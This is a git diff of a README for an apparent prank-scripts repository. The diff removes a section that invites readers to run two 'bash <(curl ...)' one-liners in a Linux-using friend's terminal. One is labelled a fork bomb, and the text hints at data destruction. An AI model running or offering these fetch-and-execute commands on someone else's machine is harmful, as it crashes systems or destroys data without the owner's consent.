@@ -1,28 +1,5 @@
-# Have a Bit of Fun with that one Guy Who Likes the CMD Terminal
-Have you ever been pestered by that one guy who loves tux too much?
-Have you nearly been converted to the cult that is Linux users?
-Have people tried to destroy your computer because you use bloated Windows 11 (or 10)?
+# Scripts
 
-### Well I have the Solution for you!
+I just wanted a place to put the stupid scripts i make.
 
-Simply run one of these two scripts in his terminal and presto! 
-You have earned both respect and a new mortal enemy with the backing of thousands!
-But don't worry Microsoft won't be able to recover your data after what they are about to do to you...
-
-### Scripts
-<details>
-  <summary>Super Secret Plans</summary>
-  
-  - **Fork Bomb (Actual Bomb)**
-    
-	```
-    bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/innocence.sh") 
-    ```
-	
-  - **rm -rF (Not Real)**
-
-	```
-	bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/for-my-best-friend.sh") 
-    ```
-	
-</details>
+have fun with them or change then idc. hope they help or inspire you.
